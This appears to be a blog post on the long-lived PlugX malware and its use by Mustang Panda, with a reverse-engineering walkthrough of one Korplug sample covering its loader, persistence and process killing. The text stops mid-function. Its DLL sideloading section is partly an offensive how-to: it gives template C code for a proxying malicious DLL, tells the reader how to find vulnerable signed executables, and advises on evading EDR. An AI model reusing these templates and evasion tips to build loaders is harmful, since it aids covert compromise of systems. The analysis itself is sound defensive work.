---
layout: post
title: "PlugX and its Refusal to Go Away"
date: 2025-04-13 15:30:00 +0200  
categories: Malware_Analysis, PlugX
tags: plugx, apt, malware, reverse_engineering, threat_intelligence  
description: "technical analysis and short historic breakdown of plugx"
comments: false
---


# Introduction

If it ain't broke, don't fix it - just tweak it a little. That should be the catchphrase for PlugX.
It's quite rare to see a piece of malware stick around for so long, but PlugX has managed to stay relevant since its first appearance back in 2008.

Iterated several times, starting out as a basic RAT (Remote Access Trojan) it has over the years lived up to its plugin mentality to adapt its package for the campaign; however it always follows the rule of three. A legitimate executable, a malicious module (DLL) and payload.
PlugX has most commonly been associated with Chinese APT actors and perhaps most of all with Mustang Panda.


# Mustang Panda || Twill Typhoon || … RedDelta?

As the Swedish proverb goes, "A loved child has many names." This is also true for Mustang Panda among its APT counterparts. Whether it's Twill Typhoon, RedDelta, Bronze President, or TA416, these names are part of its varied identification. The group checks all the boxes, so to speak, for a typical Chinese APT.
It is likely a private contractor for the Ministry of State Security (MSS), utilizing readily available malware while maintaining its own portfolio, as evidenced by recent activities. Its operations align with the political interests of the People's Republic of China (PRC), as can be observed through its targeted campaigns.

The group primarily focuses on collecting information related to Tibet, Inner Mongolia, Belt & Road Initiative countries, Europe, North America, the Middle East, and Africa (so… everywhere?). While this is not uncommon for a Chinese APT, what sets Mustang Panda apart from others is the scope and scale of its operations.

From targeting Russians, European diplomats, and even the Vatican, one thing connects them: spear phishing. Mustang Panda's arguably most common tactic involves gathering information and then crafting well-targeted spear phishing content towards those they're trying to compromise. The content is believable and relevant to the current events of the target.
For example, consider the compromise of the Vatican during the anticipated 2020 renewal of the 2018 China-Vatican provisional agreement. The compromise didn't just yield information for the negotiations but also provided insight into Hong Kong's democracy movement protests, which were in response to the Fugitive Offenders Ordinance amendment concerning extradition.

# DLL Sideloading
This method can be seen frequent in Mustang Pandas malware be it PlugX, Korplug, Hiupan or FDMTP.
When creating malware in fun and creative ways, a recurring theme is that you never want to be caught executing anything suspicious. You're like the anti-King Midas - everything you touch turns into alerts and warnings. Whether it's an .exe, a .dll, or even just making an API call, the golden rule is: always make sure someone else does the dirty work.

**Enter: DLL Sideloading.**

DLL Sideloading is like that one simple card trick you learned at the start of your (now failed) magician career - the one you still show off at gatherings. It's not flashy, but somehow, it keeps working.
At its core, it exploits the fact that most .exe files aren't standalone; they don't carry all the functionality they need. Instead, they rely on .dll files to import functions so the program can actually work. These .dll files need to be loaded from somewhere-and that "somewhere" is where we step in. There's a specific order to how Windows searches for these libraries, and understanding this search order is key.

Default Windows Search Order [1]
- The folder specified by `lpFileName`.
- The system folder. Use the `GetSystemDirectory` function to retrieve the path of this folder.
- The 16-bit system folder. There's no function that obtains the path of this folder, but it is searched.
- The Windows folder. Use the `GetWindowsDirectory` function to get the path of this folder.
- The current folder.
- The directories that are listed in the `PATH` environment variable. This doesn't include the per-application path specified by the `App Paths` registry key. The `App Paths` key isn't used when computing the DLL search path.

At this point, you might be thinking, "Isn't this just like preloading?" And, well… sort of ಥ_ಥ. The key difference is that preloading versus sideloading depends on who triggers the executable that loads the DLL. If you're the one executing it, it's sideloading; if you're waiting for someone else to do it, it's preloading.

Why this isn't called active vs. passive sideloading is beyond me - but hey, I don't make the rules.
All you (sort of) have to do is find a signed executable - whether it's from Microsoft or a third-party application doesn't really matter.

Use Process Monitor to check which DLLs it tries to load and look for "NAME NOT FOUND" entries. Ideally, you want an executable that searches for a missing DLL in its own directory - this makes setup much easier. Just drop your malicious DLL in the right spot, and boom - Bob's your uncle.
Things that could ruin your sideloading adventures:

Using critical system DLLs like ntdll.dll or bcrypt.dll. The executable might actually need these, and replacing them could break functionality. You could implement the required functions yourself, but… why? ¯\(°_o)/¯

Writing code inside DllMain. This can introduce DLL load lock issues because DllMain executes within a synchronized lock. In simple terms: A must go before B, but if A gets stuck, B never happens. Avoid the headache-let the executable call your exports.

```C
#include <Windows.h>

extern __declspec(dllexport) PVOID __cdecl ExampleExportFunc() {
    MessageBoxA(NULL, "DLL Sideloading beep boop!", "Success", MB_OK);
}
BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReasonForCall, LPVOID lpReserved) {
    switch (dwReasonForCall) {
    case DLL_PROCESS_ATTACH:
        ExampleExportFunc(); // Oh no, potential DLL Load Lock!
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

If your executable is vibing with calling functions by ordinal numbers instead of names, you'll need to handle exports properly. One way is to create a Module-Definition File (.def) in Microsoft Visual Studio and let it handle the magic for you. Or, better yet - break free and embrace CMake!

```C
---- CMAKE ----
add_library(project-name SHARED <Sus DLL>.c)
set_target_properties(project-name PROPERTIES LINK_FLAGS "/DEF:${CMAKE_SOURCE_DIR}/exports.def")
---- .def ----
EXPORTS
  YourCoolFunction @OrdinalNumber
```

Don't mess too much with official files in C:\Windows\System32-EDRs are like neurotic cleaners who really don't appreciate things being out of place. A misplaced or altered file might set off alarms and land your work in front of an unlucky analyst. Best to keep a low profile.
To wrap things up, it's all about the proxy, proxy and more proxies. Make sure the exported functions operate as expected. Open your thread or whatever necessary context, then call the required function and return control when done. This ensures smooth execution while allowing the functions to work properly.

```C
--- Pseudo DLL ----
#include <Windows.h>
// Why implement when you can proxy. Implement per function required(づ￣ 3￣)づ
#pragma comment (linker, "/export:<yourFunc>=<newName>.<yourFunc>,@ordinal")

VOID megaMalware(){
  MessageBoxA(NULL, "Boh!", "We made it!", MB_OK | MB_ICONEXCLAMATION);
}
typedef PVOID(WINAPI* <yourFunc>)();
extern __declspec(dllexport) PVOID <yourFunc>() {
  // Launch that sucker!
  CreateThread(NULL, 0x00, megaMalware, NULL, 0x00, NULL);
  
  // Launch the expected func 
  ## Loadlib
  ## GetProcAddress
  return <yourFunc>();
  
}
BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReasonForCall, LPVOID lpReserved) {
    switch (dwReasonForCall) {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

## Side Quest: DLL techniques, why didn't PlugX change…!?!

We're interrupting this article to bring you breaking news about a rabbit hole I've managed to create for myself. Feel free to skip this section if you're not interested in the following quest.

After spending about a month staring myself blind at PlugX samples, I've started questioning why DLL sideloading is still being used. The answer is quite simple and can be found at the beginning of this article: because it works. Additionally, APTs have no incentive to reveal further capabilities, especially when dealing with malware that has already been extensively analysed and mapped.

Even outside an organizational perspective, when looking at software solutions, complexity doesn't necessarily translate to greater efficiency or better performance. In fact, it can create a larger surface for failure - something far from ideal when discussing evasion techniques. But I digress - there are simply too many "ifs" and "buts" here.

What would be the alternative? Dare I delve into the bottomless pit of what it could do rather than what it does?
So, at the very least, let's put up some railings for safety. The techniques must involve a DLL and ultimately lead to payload execution - let's try to avoid anything merely DLL-adjacent.

Oh, and remote DLL injection? It's almost like… no, it isn't. Back off!

The final contestants are… (⊙_⊙)？

- Module Stomping & Overloading
- Reflective DLL-Injection
- COM Hijacking

Something you will quickly notice is that switching from DLL-Sideloading to one of these techniques brings a significant change to the original structure and procedures of PlugX variants. This, in turn, raises the question: could it even be classified as PlugX if this one technique were to be changed?
Module Stomping & Overloading

These techniques require no major introduction because their names clearly describe what they aim to achieve (unlike DLL Preloading ⊙﹏⊙∥). Both methods involve loading a sacrificial DLL and then overwriting it - either by injecting shellcode into the .text section or by mapping an entire PE file into the DLL's memory space.

The payload is typically loaded into an image region rather than a private region, mainly for evasion purposes. The easiest way to compare this is:
`VirtualAlloc();` → Private memory
`LoadLibrary();` → Image memory

These techniques can, of course, be further improved, for example, by using Library Proxying or utilizing NtCreateSection & NtMapViewOfSection to avoid CFG code blocks.

You might see DLL Hollowing mentioned as well, but I think the entire idea and procedure are too similar to warrant a separate section for it.
COM Hijacking

Essentially, what we want to achieve with this technique is to change registry entries to point to a malicious DLL. When interacting with COM objects, you do so by querying the registry essentially. If you use ProcMon to monitor when this interaction takes place, you can filter on "NAME NOT FOUND" just like you did with DLL Sideloading. Place a tasteful .DLL in the path and we're good.

> **Note:** Sometimes reading MITRE Mitigation recommendations is pure joy.

"This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
It isn't a vulnerability, just a rogue system feature.

# Reflective DLL-Injection

If you've explored C&C frameworks, you've likely encountered Reflective DLL Injection - a common technique for delivering payloads, used in tools like Metasploit and Cobalt Strike.

At its core, Reflective DLL Injection functions as a local PE loader within a remote process. This is achieved through a reflective DLL injector, which handles critical tasks such as fixing the Import Address Table (IAT), setting appropriate memory permissions, and applying relocations.

The process typically involves three key steps:
1. Writing the DLL into the target process.
2. Executing an exported function within the DLL, which performs the actual injection and sets up the necessary structures.
3. Running the DLL's entry point.

The biggest challenge in this technique is that you're essentially building a PE loader inside a remote address space, requiring significant manual effort. Moreover, you cannot rely on Windows APIs or global variables, as their offsets will not align, leading to access violations.

It becomes clearer when considering the "what-if" scenarios - introducing new techniques, especially those fundamental to payload delivery, ultimately shapes the overall direction of the malware.

# Technical Analysis

Knowing a little more about the history of PlugX, its variants and the actors that utilize it; I thought that perhaps a closer look at one of many iterations of PlugX would be fun ♪(´▽｀).

Like mentioned above regarding the rule of three, this sample also contains three essential parts that are all necessary to successfully execute the payload.

| File Name       | SHA256 Hash                                                             |
|------------------|-------------------------------------------------------------------------|
| AvastSvc.exe    | 00fbfaf36114d3ff9e2c43885341f1c02fade82b49d1cf451bc756d992c84b06        |
| wsc.dll         | e8f55d0f327fd1d5f26428b890ef7fe878e135d494acda24ef01c695a2e9136d        |
| AvastAuth.dat   | 432a07eb49473fa8c71d50ccaf2bc980b692d458ec4aaedd52d739cb377f3428        |

## RE AvastSvc.exe & wsc.dll

This particular variant of PlugX, also known as Korplug. It often gets packaged in the RECYCLE.BIN folder and masquerades as a driver to trick the user into clicking on it. This social engineering tactic helps it spread and execute on compromised systems and to other USBs connected to the endpoint.

### AvastSvc.exe

AvastSvc.exe isn't doing anything close to rocket science; its entire purpose is to load the wsc.dll and a specific function within it then close.
AvastSvc.exe Entry FunctionTranslated into C

So, when we translate that assembly into C, we get a straightforward if/else tree structure. The legitimate file itself is irrelevant - it's only used because it's a "trusted and signed" executable.

```c
#include <windows.h>

HMODULE hModule;
FARPROC fpFuncPointer;
Size_T errorCode;

hModule = LoadLibraryW(L"wsc.dll");

if(!hModule) {
  errorCode = GetLastError();
} else {
  fpFuncPointer = GetProcAddress(hModule, "_run@4");
  if(!fpFuncPointer) {
    errorCode = GetLastError();
  } else {
  ...
  }
```

### wsc.dll

The wsc.dll is more interesting since this is where we can find the shellcode and exported functions.
AvastSvc.exe imports functions by ordinal, we can quickly map labels to ordinals to identify the exported functions. Most of them are just random junk and filler functions.

Exported Functions:
- afqsisambtbcqlokdmjcicvhkmacmyskthcrvcfpfgdxjyypk
- fggrcqaonkufmcjsqrdgrrkbidomminmwabwbcerox
- gmepnmhkysgyg
- oriphpnyfhvjphereotxjijlcpmshpfdhkebxy
- run
- ugk
- uspkmoqdkldgvjkqbwsnajsayvtcxxownymkr
- vwfsivelhgsvrnevmnuunbjrstp
- xuxlwqbanylwxwwjutqxuvalny

wsc.dll Ordinals (Exported Functions)It's not too hard to see what function is of interest for us in this case. (. ❛ ᴗ ❛.)
wsc.dll Target FunctionThe only function we care about is this one since it's the one being called. While the rest of the DLL contains many other functions and unnecessary details, this is the only one of interest. Ultimately, this is the function that delivers the shellcode.

```c
void FUN_10001bf0(void) 

{
   HMODULE hModule;
   FARPROC pFVar1;
   
   ...
   
   local_c = DAT_1001003c ^ (uint)&stack0xfffffffc;
   builtin_strncpy(local_4c,"\\AvastAuth",0xb); /*Stack string that Ghidra compounded for us.*/
   local_15c = '\0';
   _memset(local_15b,0,0x103);
   builtin_memcpy(local_40,"kernel32",9); /*Stack string that Ghidra compounded for us.*/
   local_28 = 9;
   builtin_memcpy(local_20,"GetModuleFileNameA",0x13);
   lpProcName = local_20;
   hModule = GetModuleHandleA(local_40);
   pFVar1 = GetProcAddress(hModule,lpProcName);
   (*pFVar1)(0,&local_15c,0x104);
   local_8 = strrchr(&local_15c,0x5c);
   if (local_8 != NULL) {
      *local_8 = '\0';
   }
   local_34[1] = '\0';
   local_34[2] = '\0';
   local_34[3] = '\0';
   local_34[4] = '\0';
   local_34[0] = '.';
                               /* WARNING: Ignoring partial resolution of indirect */
   local_34[1] = 100;
   local_28 = 5;
   local_1a4 = '\0';
   _memset(local_1a3,0,0x3f);
   local_164 = _strlen(local_4c);
   _strncpy(&local_1a4,local_4c,local_164);
   _strncat(&local_1a4,local_34,4); /* Only the first four a copied so .dat */
   lstrcatA(&local_15c,&local_1a4);
   local_160 = NULL;
   local_24 = NULL;
   local_54 = 0;
   FUN_10001000(&local_15c,&local_24,&local_54); /* Opens and reads file */
   if (local_54 == 0) {
                               /* WARNING: Subroutine does not return */
      _exit(0);
   }
    
  ...

   FUN_100015d0(local_160,local_54);
   __security_check_cookie(local_c ^ (uint)&stack0xfffffffc);
   return;
}
```


Fortunately, Ghidra handled the stack strings present in this part of the code, which will be a recurring theme throughout. However, it struggled to determine the correct file extension, which should be .dat.

As seen below, the software moves 0x61 ('a') and 0x74 ('t') into the same address space as 'd', forming the expected extension.
wsc.dll FUN_10001bf0 (.dat extension)The variables are then passed to FUN_10001000 by reference. Digging into this function, we eventually reach FUN_100014E0, which calls CreateFileA. This strongly suggests that the function is responsible for creating or reading the file and eventually decrypt the payload.

```c
undefined4 __cdecl FUN_100014e0(LPCSTR param_1,LPVOID param_2,DWORD param_3)

{
   undefined4 uVar1;
   BOOL BVar2;
   DWORD local_10;
   char local_9;
   HANDLE local_8;
   
   local_9 = 'H';
   local_8 = CreateFileA(param_1,0x80000000,1,NULL,3,0x80,NULL);
   local_9 = (char)((int)local_9 / 0xbc) * 'k';
   if (local_8 == (HANDLE)0xffffffff) {
      uVar1 = 0;
   }
   else {
      BVar2 = ReadFile(local_8,param_2,param_3,&local_10,NULL);
      if (BVar2 == 0) {
         CloseHandle(local_8);
         uVar1 = 0;
      }
      else {
         CloseHandle(local_8);
         uVar1 = 1;
      }
   }
   return uVar1;
}
```

So, to dump the decrypted content of the .dat file, we know that the file is passed to FUN_10001000 for opening. Later, we observe a LocalAlloc call, which returns a handle to the allocated object. By setting a breakpoint on that address and following the process, we should be able to retrieve the payload.

- **Find the LocalAlloc call**: Identify the function call to `LocalAlloc` in the disassembled code.
- **Step over and track the address**: Step over the `LocalAlloc` call and note the address it returns.
- **Locate the decryption loop**: Find the loop responsible for decrypting the payload.
- **Set a breakpoint**: Place a breakpoint immediately after the decryption loop completes.
- **Dump the memory region**: Dump the memory region containing the decrypted payload.
- **Adjust if needed**: Analyze the dumped payload and make any necessary adjustments to ensure it is properly formatted and functional.

Debug AvastSvc.exe LocalAllocDebug AvastSvc.exe Allocated MemoryDebug AvastSvc.exe Populated Address Space ❤Like clockwork!
After dumping the section with Scylla you trim of the edges and there should be a working payload PE file waiting.
PE Bear - Payload Memory DumpRE payload time!

One of my main frustrations with Ghidra is its excessive use of if/else statements, often resulting in convoluted and bloated decompiled code. While it's true that the structure of these conditionals largely depends on the compiler and optimization settings used, Ghidra sometimes fails to produce clean logic.

For instance, switch statements can be translated into either a fall-through sequence of conditional jumps or a jump table, depending on the original assembly. However, Ghidra's handling of these structures can sometimes make the output less readable than necessary. But I digress - let's move on.

#### PAYLOAD Main Func

```c
undefined4 FUN_10001b60(void)

{
  undefined4 uVar1;
  int iVar2;
  undefined *puVar3;
  int iVar4;
  int *piVar5;
  int local_8;
  
  FUN_10001830();
  local_8 = 0;
  piVar5 = &local_8;
  uVar1 = FUN_10001730();             
  iVar2 = FUN_100015c0(uVar1,piVar5); 
  if (local_8 == 1) {
    FUN_100090e0();
    FUN_100016c0(0);
  }
  else if (local_8 == 2) {
    puVar3 = FUN_1000c3e0();
    uVar1 = FUN_10001650(0,0,puVar3);
    iVar4 = FUN_100017a0();
    if (iVar4 == 0xb7) {
      FUN_100016c0(0);
    }
    iVar2 = FUN_10001950(*(undefined4 *)(iVar2 + 4),L"-net",8);
    if (iVar2 == 0) {
      FUN_10014580();
      FUN_100090e0();
      FUN_100016c0(0);
    }
    FUN_100153a0();
    FUN_100019b0();
    FUN_10001000(uVar1);
  }
  else if (local_8 == 3) {
    FUN_10015400(*(undefined4 *)(iVar2 + 4));
    puVar3 = FUN_1000c3e0();
    uVar1 = FUN_10001650(0,0,puVar3);
    iVar2 = FUN_100017a0();
    if (iVar2 == 0xb7) {
      FUN_100016c0(0);
    }
    else {
      FUN_10001000(uVar1);
      FUN_100090e0();
      FUN_100016c0(0);
    }
  }
  FUN_10001810();
  return 0;
}
```

The first function of interest is the one (FUN_10001730) preceding our if/else (or switch) block. It is responsible for retrieving the address of GetCommandLineW, which returns a pointer to the command-line string for the current process.

The function first copies the name of GetCommandLineW into a character buffer and then calls another function to load the corresponding module. This module-loading function ultimately calls LoadLibrary to load kernel32.dll, where the Windows API function resides.

Once the module is loaded, GetProcAddress is used to retrieve the function's address using the module handle and the function name. The retrieved address is then stored and later invoked via a function pointer, dereferenced and executed dynamically.

#### Payload 1st interesting func

```c

void FUN_10001730(void)

{
  HMODULE hModule;
  CHAR *lpProcName;
  CHAR local_14 [16];
  
  builtin_memcpy(local_14,"GetCommandLineW",0x10);
  if (DAT_10028818 == (FARPROC)0x0) {
    lpProcName = local_14;
    hModule = FUN_100014b0();
    DAT_10028818 = GetProcAddress(hModule,lpProcName);
  }
  (*DAT_10028818)();
  return;
}
```
#### Payload FUN_10014b0()

```c
HMODULE FUN_100014b0(void)

{
  CHAR local_10 [12];
  
  builtin_memcpy(local_10,"kernel32",9);
  if (DAT_100287e0 == (HMODULE)0x0) {
    DAT_100287e0 = LoadLibraryA(local_10);
  }
  return DAT_100287e0;
}
```

The next function, located just below, is responsible for parsing the command-line string that was just retrieved. It follows the same methodology:
Obtain a handle to the module (hModule).
Use GetProcAddress to locate the function.
Call LoadLibraryA to load the necessary library.
Dereference the function pointer and invoke the target function.

#### Payload 2nd interesting func

```c

void FUN_100015c0(undefined4 param_1,undefined4 param_2)

{
  HMODULE hModule;
  CHAR *lpProcName;
  CHAR local_18 [20];
  
  builtin_memcpy(local_18,"CommandLineToArgvW",0x13);
  if (DAT_1002882c == (FARPROC)0x0) {
    lpProcName = local_18;
    hModule = FUN_10001900();
    DAT_1002882c = GetProcAddress(hModule,lpProcName);
  }
  (*DAT_1002882c)(param_1,param_2);
  return;
}
```

#### Payload FUN_10001900()

```c
HMODULE FUN_10001900(void)

{
  CHAR local_c [8];
  
  builtin_memcpy(local_c,"shell32",8);
  if (DAT_10028810 == (HMODULE)0x0) {
    DAT_10028810 = LoadLibraryA(local_c);
  }
  return DAT_10028810;
}
```
Rewriting the main function, I've decided to go through all the functions and quickly clean up the decompiled code to make it easier to understand the interesting functions and the flow of the payload.

```c
undefined4 Main(void)

{
  undefined4 uVar1;
  int iVar2;
  undefined *puVar3;
  int iVar4;
  int *piVar5;
  int local_8;
  
  unknown_library_modules();
  local_8 = 0;
  piVar5 = &local_8;
  uVar1 = GetCommandLineW();
  iVar2 = CommandLineToArgvW(uVar1,piVar5);
  if (local_8 == 1) {
    FUN_100090e0();
    ExitProcess(0);
  }
  else if (local_8 == 2) {
    puVar3 = FUN_1000c3e0();
    uVar1 = CreateMutexW(0,0,puVar3);
    iVar4 = GetLastError();
    if (iVar4 == 0xb7) {
      ExitProcess(0);
    }
    iVar2 = memcmp(*(undefined4 *)(iVar2 + 4),L"-net",8);
    if (iVar2 == 0) {
      FUN_10014580();
      FUN_100090e0();
      ExitProcess(0);
    }
    FUN_100153a0();
    FUN_100019b0();
    CloseHandle(uVar1);
  }
  else if (local_8 == 3) {
    FUN_10015400(*(undefined4 *)(iVar2 + 4));
    puVar3 = FUN_1000c3e0();
    uVar1 = CreateMutexW(0,0,puVar3);
    iVar2 = GetLastError();
    if (iVar2 == 0xb7) {
      ExitProcess(0);
    }
    else {
      CloseHandle(uVar1);
      FUN_100090e0();
      ExitProcess(0);
    }
  }
  FUN_10001810();
  return 0;
}
```

#### Switch Case 1

After cleaning up the function calls and stackstrings, the initial function becomes quite easy to read.
In the main function, case 1 contains one function of interest: FUN_100090e0(). Additionally, there is a call to ExitProcess(), which is executed once this function presumably returns.

At first glance, it seems like three files are copied to a directory determined by stackstrings. These strings resolve environment variables:
%USERPROFILE%: Points to C:\Users\username
%ALLUSERSPROFILE%: Points to C:\ProgramData

The program retrieves these environment variables using ExpandEnvironmentStringsW and stores the result in local_31c.
Furthermore, it registers AvastSvc.exe in the registry to establish persistence, then re-executes the process.

This raises an interesting question: since local_8 was initialized to 0 in the main function, would we see a different initialization value if we dump the payload after persistence has been created.

```c
undefined4 init(void)
{
  // ...init statements

  local_8 = (undefined *)L'\x100090ed';

  local_3c = L'%'; // %userprofile%\\\0, %allusersprofile%\\\0
  // ... stackstrings
  local_40 = L'\0';

  lstrcpyW(local_114c,&local_3c);
  lstrcpyW(local_f44,&local_64);
  local_8 = FUN_1000c320();
  lstrcatW(local_114c,local_8);
  lstrcatW(local_f44,local_8);
  lstrcatW(local_114c,&DAT_100222b4);
  lstrcatW(local_f44,&DAT_100222b8);
  ExpandEnvironmentStringsW(local_f44,local_31c,0x208); // Puts dir name in local_31c
  iVar1 = GetFileAttributesW(local_31c);
  if ((iVar1 == -1) && (iVar1 = CreateDirectoryW(local_31c,0), iVar1 == 0)) {
    ExpandEnvironmentStringsW(local_114c,local_31c,0x208);
  }
  lstrcpyW(local_524,local_31c);
  lstrcatW(local_524,L"AvastSvc.exe");
  lstrcpyW(local_1964,local_31c);
  lstrcatW(local_1964,L"wsc.dll");
  lstrcpyW(local_1d6c,local_31c);
  lstrcatW(local_1d6c,L"AvastAuth.dat");
  local_14[0] = 0;
  local_14[1] = 0;
  local_14[2] = 0;
  local_d3c = 0;
  memset(local_d3a,0,0x1fe);
  local_175c = 0;
  memset(local_175a,0,0x1fe);
  local_1b64 = 0;
  memset(local_1b62,0,0x1fe);
  local_72c = L'\0';
  memset(local_72a,0,0x206);
  local_b3c = 0;
  memset(local_b3a,0,0x206);
  local_155c = L'\0';
  memset(local_155a,0,0x206);
  local_1354 = L'\0';
  memset(local_1352,0,0x206);
  GetModuleFileNameW(0,&local_b3c,0x208);
  FUN_10016909(&local_b3c,local_14,3,&local_d3c,0x100,&local_175c,0x100,&local_1b64,0x100);
  
  wsprintfW(&local_72c,L"%s%s",local_14,&local_d3c);
  wsprintfW(&local_155c,L"%s%s",&local_72c,L"wsc.dll");
  wsprintfW(&local_1354,L"%s%s",&local_72c,L"AvastAuth.dat");
  
  FUN_10007380(local_31c);
  SetFileAttributesW(local_31c,2);
  SetFileAttributesW(local_31c,2);
  CopyFileW(&local_b3c,local_524,0);
  CopyFileW(&local_155c,local_1964,0);
  CopyFileW(&local_1354,local_1d6c,0);
  uVar2 = GetSystemTimeAsFileTime((longlong *)0x0);
  modify_holdrand(uVar2);
  uVar3 = new_seedrand_value();
  seedvalue = (int)uVar3 % 899 + 100;
  wsprintfW(local_934,L"\"%s\" %d",local_524,seedvalue);

  local_c0 = L'S'; // Software\\Microsoft\\Windows\\CurrentVersion\\Run
  // ...Stackstring
  local_68 = L'n';

  local_66 = 0;
  uVar4 = 1;
  iVar1 = lstrlenW(local_934);
  // Adds our .exe to 0x80000002 => HKEY_LOCAL_MACHINE
  RegCreateKey(0x80000002,&local_c0,local_8,local_934,iVar1 * 2 + 2,uVar4);
  uVar4 = 1;
  iVar1 = lstrlenW(local_934);
  // Adds our .exe to 0x80000001 => HKEY_CURRENT_USER
  RegCreateKey(0x80000001,&local_c0,local_8,local_934,iVar1 * 2 + 2,uVar4);
  local_1c[0] = L'\0';
  local_1c[1] = L'\0';
  local_1c[2] = L'\0';
  local_1c[3] = 0;
  wsprintfW(local_1c,L" %d",seedvalue);
  lstrcatW(local_524,local_1c);
  memset(&local_d0,0,0x10);
  memset(local_114,0,0x44);
  local_114[0] = 0x44;
  local_e8 = 1;
  local_e4 = 1;
  // 1st variable = NULL => local_524 contains the info for execution
  // 2nd variable = commandline input
  // 3rd variable = NULL, no inheritence
  // 4th variable = NULL, no inheritence
  // 5th variable = NULL, no inheritence
  // 6th variable = 4, CREATE_SUSPENDED
  // 7th variable = NULL, use current environment block
  // 8th variable = local_114, STARTUPINFO
  // 9th varaible = local_d0, PROCESS_INFORMATION
  iVar1 = CreateProcessW(0,local_524,0,0,0,4,0,0,local_114,&local_d0);
  // If succeed, resume process
  if (iVar1 != 0) {
    ResumeThread(local_cc);
    CloseHandle(local_d0);
    CloseHandle(local_cc);
  }
  return 0;
}
```


#### Switch Case 2

There's something more interesting happening here. The software attempts to create a mutex, and depending on the outcome, it checks if -net was part of the command-line arguments. If it was, it runs FUN_10014580(), followed by init(), which essentially restarts the process. If not, it simply continues execution and runs FUN_100153a0(); and FUN_100019b0();.

##### MAIN Switch case 2 

```c
 else if (local_8 == 2) {
    puVar3 = ret_&DAT_10031c8c();
    uVar1 = CreateMutexW(0,0,puVar3);
    iVar4 = GetLastError();
    if (iVar4 == 0xb7) {
      ExitProcess(0);
    }
    iVar2 = memcmp(*(undefined4 *)(iVar2 + 4),L"-net",8);
    if (iVar2 == 0) {
      FUN_10014580();
      init();
      ExitProcess(0);
    }
    FUN_100153a0();
    FUN_100019b0();
    CloseHandle(uVar1);
  }
```

From this point, I'll need to break it down even further to make it more readable. We're going to explore three different paths: FUN_10014580(), FUN_100153a0(), and FUN_100019b0(). Each of these will, in turn, lead to other functions.

FUN_10014580

Just like the previous registry edits, we are seeing the malware adding a subkey Version with a value of 1.

```c
void FUN_10014580(void)

{
  
  local_c[0] = L'\0';
  local_c[1] = L'\0';
  local_c[2] = L'\0';
  local_c[3] = 0;
  wsprintfW(local_c,L"1"); 
  // ... stackstring System\\CurrentControlsSet\\Control\\Network
  // ... stackstring Version
  local_e = 0;
  uVar2 = 1;
  iVar1 = lstrlenW(local_c);
  RegCreateKey(0x80000002,&local_70,&local_1c,local_c,iVar1 * 2 + 2,uVar2);
  uVar2 = 1;
  iVar1 = lstrlenW(local_c);
  RegCreateKey(0x80000001,&local_70,&local_1c,local_c,iVar1 * 2 + 2,uVar2);
  return;
}
```

FUN_100153a0()

There's two paths going from here. One is FUN_10015600(); and the other one creates a thread that will run a function FUN_10014e10.
```c
undefined4 FUN_100153a0(void)

{
  undefined4 local_c;
  int local_8;
  
  FUN_10015600();
  local_c = 0;
  local_8 = CreateThread(0,0,FUN_10014e10,0,0,&local_c);
  if ((local_8 != 0) && (local_8 != 0)) {
    CloseHandle(local_8);
  }
  return 0;
}
```

The first function FUN_100072b0 is used to seek out SeDebugPrivilege to have the ability to later on close and delete .exe files and registry run files. It does so by utilizing the Windows APIs LookupPrivilegeValueW and AdjustTokenPrivileges.

```c
void FUN_10015600(void)

{
  // ... stackstring AdobeHelper.exe
  // ... stackstring AdobeUpdates.exe
  // ... stackstring AdobeUpdate.exe
  // ... stackstring AdobeARM.exe
  // ... stackstring AAM_UPDATE.exe
  // ... stackstring AAM_Updates.exe
  // ... stackstring SeDebugPrivilege

  local_8 = L'\0';
  DebugPriv(&local_28,1);
  FUN_100133d0((undefined1 (*) [16])&local_84);
  FUN_100133d0((undefined1 (*) [16])&local_e8);
  FUN_100133d0((undefined1 (*) [16])&local_c4);
  FUN_100133d0((undefined1 (*) [16])&local_44);
  FUN_100133d0((undefined1 (*) [16])&local_64);
  FUN_100133d0((undefined1 (*) [16])&local_a4);
  DebugPriv(&local_28,0);
  return;
}
Here we see the use of AdjustTokenPrivileges to gain permissions to interact with the files.
undefined4 __cdecl FUN_100072b0(undefined4 param_1,int param_2)

{
  undefined4 uVar1;
  int iVar2;
  undefined4 uVar3;
  int *piVar4;
  undefined4 local_20;
  undefined1 local_1c [8];
  undefined4 uStack_14;
  undefined4 local_10;
  undefined4 local_c;
  int local_8;
  
  local_c = 0;
  local_8 = 0;
  piVar4 = &local_8;
  uVar3 = L'(';
  uVar1 = GetCurrentProcess();
  iVar2 = OpenProcessToken(uVar1,uVar3,piVar4);
  if (iVar2 == 0) {
    local_c = GetLastError();
  }
  else {
    iVar2 = LookupPrivilegeValueW(0,param_1,local_1c);
    if (iVar2 == 0) {
      local_c = GetLastError();
    }
    else {
      local_20 = 1;
      if (param_2 == 0) {
        local_10 = 0;
      }
      else {
        local_10 = 2;
      }
      uStack_14 = local_10;
      iVar2 = AdjustTokenPrivileges(local_8,0,&local_20,0x10,0,0);
      if (iVar2 == 0) {
        local_c = GetLastError();
      }
    }
  }
  if (local_8 != 0) {
    CloseHandle(local_8);
  }
  return local_c;
}
```

As mentioned above, we can see in FUN_100133d0 that the malware utilizes CreateToolhelp32Snapshot to iterate through all the live processes and terminate any process that matches a string parameter provided; it does so in the Find_Process_Name which then kills with TerminateProcess.

It will then enter a recursive loop in Recursive_Delete_FilesDirectories, which will go through and delete all files and directories associated with the process. Another aspect that appears frequently is the use of Sleep(100), which introduces a delay to ensure that things run smoothly and avoid errors while handling the files.

```c
void __cdecl FUN_100133d0(undefined1 (*param_1) [16])

{
  WCHAR local_218;
  uint local_216 [129];
  int local_10;
  undefined2 *local_c;
  int local_8;
  
  local_218 = L'\0';
  memset(local_216,0,0x206);
  Find_Process_Name(param_1,&local_218,&local_10);
  if (local_218 != L'\0') {
    TerminateProcess(local_10);
    local_c = (undefined2 *)FUN_1000ae90((undefined1 (*) [16])&local_218,0x5c);
    if (local_c != (undefined2 *)0x0) {
      *local_c = 0;
    }
    Sleep(100);
    Recursive_Delete_FilesDirectories(&local_218);
    local_8 = FUN_1000ae90((undefined1 (*) [16])&local_218,0x5c);
    if (local_8 != 0) {
